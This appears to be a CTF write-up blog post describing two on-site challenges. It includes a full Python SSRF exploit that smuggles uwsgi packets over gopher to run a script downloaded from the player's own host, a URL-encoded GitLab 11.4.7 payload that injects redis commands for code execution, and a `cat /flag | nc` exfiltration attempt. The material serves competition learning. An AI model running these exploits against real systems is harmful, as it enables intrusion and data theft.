You can see some challenges having `(demo)` which means players have to demonstrate the poc on the stage.
It was super cool concept for audience to see what is going on there. 
Also there was a real car on the stage to be hacked, the monitor on driving seat would be controlled like these posts:

So the competition organizing was totally excellent which is one of the best CTF I've ever played.  
We TokyoWesterns ended up with 6th place with solving Magic Tunnel, router and flaglab, still enough to receive $10,000 USDT!! Why the organizers are so rich? :)
  
Now let's move on and see details of challenges I solved.


## Magic Tunnel {#magictunnel}
Description was just one URL where the challenge is hosted.
It seems something like simple uploader by url and found that was using curl to get contents without any validation for the given url.

I found the application is built with django by checking `/proc/self/cmdline` and extracted all related codes.
First I tried to get shell using `SECRET_KEY` from `settings.py` but there is no serialization stuff.
Next I found uwsgi setting using tcp socket as backend service for nginx proxy so I tried to abuse them.

In CGI protocol, there is some variables including script path to be executed. I thought uwsgi protocol should also have same mechanism.

Here is example packet from nginx proxy to uwsgi socket:

```

note that some variables are required to query uwsgi socket.
After some trying, I found important variables `UWSGI_FILE` and `SCRIPT_NAME` used to specify script path to be executed.
`UWSGI_FILE` is path to script and `SCRIPT_NAME` is just something related to function name to trigger (I don't know but not important).

So it's enough to execute arbirary script if I could query uwsgi socket with following variables:
```
{
    'QUERY_STRING': '',
    'REQUEST_METHOD': 'GET',
    'REQUEST_URI': '/',
    'PATH_INFO': '/',
    'SERVER_PROTOCOL': 'HTTP/1.1',
    'DOCUMENT_ROOT': '/',
    'SERVER_NAME': '',
    'HTTP_HOST': '100.100.0.5:8080',
    'UWSGI_FILE': 'path to script',
    'SCRIPT_NAME': '/a=foo'
}
```

Of course I need to send arbitrary tcp packet to query uwsgi since they are using special binary protocol.
You can find the details of uwsgi protocol at [uwsgi documentation](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html). 
It is really simple like `2 byte (length) + n byte (data)`.

Here is example code to craft uwsgi packet (using [this](https://gist.github.com/wofeiwo/9f38ef8f8562e28d741638d6de3891f6) as reference):

```python
def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items():
        pk += p16(len(k)) + k.encode('utf8') + p16(len(v)) + v.encode('utf8')
    result = b'\x00' + p16(len(pk)) + b'\x00' + pk
    return result

def gen_packet(var, body=''):
    return pack_uwsgi_vars(var) + body.encode('utf8')
```


Now I can execute arbitrary script on the server, but how to upload my payload on the server?

First I tried to connect back to my laptop from the web server but it didn't work.
So I tried to upload valid python script using some error message generated by web server, but it was really hard and seems that is impossible.

After 3 or 4 hours, I talked to my teammate and he told me the server could connect to his laptop. I was really shocked and got shell immediately. (217 got first blood during I was stuck!!!)

Here is final exploit:
```python
import requests
import sys
import struct


url = "http://100.100.0.5:8080"
# url = "http://100.100.14.206:8080"
# url = "http://localhost:8000"

p16 = lambda i:struct.pack('<H', i)
p8 = lambda i:struct.pack('<B', i)
u16 = lambda s:struct.unpack('<H', s)[0]

def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items():
        pk += p16(len(k)) + k.encode('utf8') + p16(len(v)) + v.encode('utf8')
    result = b'\x00' + p16(len(pk)) + b'\x00' + pk
    return result


def gen_packet(var, body=''):
    return pack_uwsgi_vars(var) + body.encode('utf8')

def query(path):
    sess = requests.session()
    # path = "file://{}".format(path)
    csrf = sess.get(url).content.split(b'name="csrfmiddlewaretoken" value="')[1].split(b'"')[0]
    req = sess.post(url, data={'url': path, 'csrfmiddlewaretoken': csrf})

    try:
        data_path = req.content.split(b'<img src="')[1].split(b'"')[0].decode()
    except:
        return None
    return sess.get(url+data_path).content, data_path

import urllib

_, path = query('http://100.100.14.206:8081/payload.py')

var = {
    'QUERY_STRING': '',
    'REQUEST_METHOD': 'GET',
    'REQUEST_URI': '/',
    'PATH_INFO': '/',
    'SERVER_PROTOCOL': 'HTTP/1.1',
    'DOCUMENT_ROOT': '/',
    'SERVER_NAME': '',
    'HTTP_HOST': '100.100.0.5:8080',
    'UWSGI_FILE': '/usr/src/rwctf'+path,
    'SCRIPT_NAME': '/a=hoasho4qwfe'
}

# print(query(sys.argv[1])[0], end='')
# exit()

payload = gen_packet(var, '')
# import socket
# s = socket.socket()
# s.connect(('localhost', 8000))
# s.send(payload)
# for _ in range(10):
#     print(s.recv(1024).decode())
# exit()

payload = 'gopher://127.0.0.1:8000/_'+urllib.parse.quote(payload)
print(payload)
print(query(payload))


# payload = """
# import os
# os.system('ls')
# """[1:-1]
#
# code = "a = [{}]\n\n".format(','.join(map(str, map(ord, payload))))
# code += "exec(chr(0)[1:].join(a))"
#
# a = requests.get(url+'/a/'+code).content.decode()
# f = a.find('a = [')
# t = a.find('))')+2
#
# data, data_path = query(url+'/a/'+urllib.parse.quote(code))
# print(data, data_path)
#
# sess = requests.session()
#
# http_req = """
# GET {path} HTTP/1.1
# Host: 100.100.0.5:8080
# Range: bytes={brange}
# Connection: close
#
# """[1:-1].replace('\n', '\r\n').format(path=data_path, brange='{}-{}'.format(f, t))

# print(http_req)
# payload = 'gopher://100.100.0.5:8080/_' + urllib.parse.quote(http_req)
# payload = 'gopher://localhost:8000/_' + urllib.parse.quote(http_req)
# data, data_path = query(payload)
# print(data, data_path)
# print(requests.get(url+data_path).content)

# print(query(sys.argv[1]).decode(), end='')
```

intentionaly I haven't deleted commented out line. You can see how I worked hard to solve without serving file on my laptop :P



## flaglab {#flaglab}
Let me show you a copy of description on the score server:
```
You might need a 0day.
http://100.100.0.100

download
```

The downloaded file contains just simple script to reset root password and docker-compose file. And here is docker-compose file:
```
web:
  image: 'gitlab/gitlab-ce:11.4.7-ce.0'
  restart: always
  hostname: 'gitlab.example.com'
  environment:
    GITLAB_OMNIBUS_CONFIG: |
      external_url 'http://gitlab.example.com'
      redis['bind']='127.0.0.1'
      redis['port']=6379
      gitlab_rails['initial_root_password']=File.read('/steg0_initial_root_password')
  ports:
    - '5080:80'
    - '50443:443'
    - '5022:22'
  volumes:
    - './srv/gitlab/config:/etc/gitlab'
    - './srv/gitlab/logs:/var/log/gitlab'
    - './srv/gitlab/data:/var/opt/gitlab'
    - './steg0_initial_root_password:/steg0_initial_root_password'
    - './flag:/flag:ro'
```

can you point out the vulnerability? Absolutely I couldn't on the day1, since there is no **designed** vulnerabilities - this is just GitLab in real-world.
Only one curious point is the image is not latest but one minor update before latest at the time, `11.4.8-ce.0`.

So there should be some 1day exploit by 11.4.7 which is fixed in 11.4.8. Also I've checked [GitLab CHANGELOG.md](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/CHANGELOG.md#1148-2018-11-27) but had no idea.

On the day2, I thought of SSRF to RCE in GitLab and googled with just three words `ssrf rce gitlab`, and found [Command Injection vulnerability on system_hook_push queue through web hook (#41293)](https://gitlab.com/gitlab-org/gitlab-ce/issues/41293).
In summary, they says that **you can execute arbitrary code with git user once you had a access to redis**.

Holy shit, another step is to find SSRF with CRLF injection.
It was easy to find the commit to fix the SSRF vulnerability in 11.4.7 and found [this commit](https://gitlab.com/gitlab-org/gitlab-ce/commit/ecbdef090277848d409ed7f97f69f53bbac7a92c).
So there is a way to bypass SSRF protection with IPv6 in 11.4.7. 
You can bypass SSRF protection with IPv6 like this: `[0:0:0:0:0:ffff:127.0.0.1]`

Also I've found a note about CRLF injection in [Security Release](https://about.gitlab.com/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/).
There was CRLF injection vulnerability in project mirroring with Git protocol which was enough to communicate with redis properly.

Then I wrote exploit which works locally, but didn't work on challenge server.
After some trying, I found that IPv6 is somehow disabled on the server.

I gave up to solve this challenge since my teammate are almost solving router challenge which is enough to be at 8th place.
After solving router challenge, my teammate got anxiety to be overtaken by other teams and claimed me to solve another challenge.
I explained solution and what I need to solve, then my teammate suggested me to ask organizers to enable IPv6.
And I asked organizer, 

> Hey, could you enable IPv6 if possible?

...just as a joke. Organizer said,

> OK.

I WAS IMPRESSED. only one hour remaining, still enough to get flag.

Now everything is ready to exploit. I tried to execue `cat /flag | nc [my local ip]` but it didn't work.
Then I tried to copy `/flag` to public file (I've selected my avatar) and it worked.
I totally forgot that `nc` command is not installed by default :P


Final payload for project mirroring is here:
```
git%3A//%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379/ho%0A%0Amulti%0A%0Asadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%0Alpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22File.binwrite%28%5C%27/var/opt/gitlab/gitlab-rails/uploads/-/system/user/avatar/37/avatar.png%5C%27%2C%20File.binread%28%5C%27/flag%5C%27%29%29%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%0Aexec%0A%0Aa
```

it is sending following data to redis
```
multi

sadd resque:gitlab:queues system_hook_push

lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"File.binwrite(\'/var/opt/gitlab/gitlab-rails/uploads/-/system/user/avatar/37/avatar.png\', File.binread(\'/flag\'))\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"

exec

a
```

last character `a` is to ensure that there is `\n` after `exec`. Last line `exec` will not be executed without additional line.

Then I got flag data as my avatar at `/uploads/-/system/user/avatar/37/avatar.png`.


Thanks for reading. Tomorrow post for [CTF Advent Calendar 2018](https://adventar.org/calendars/3210) will be about explanation for authored challenges in CBCTF Quals by @mage_1868.
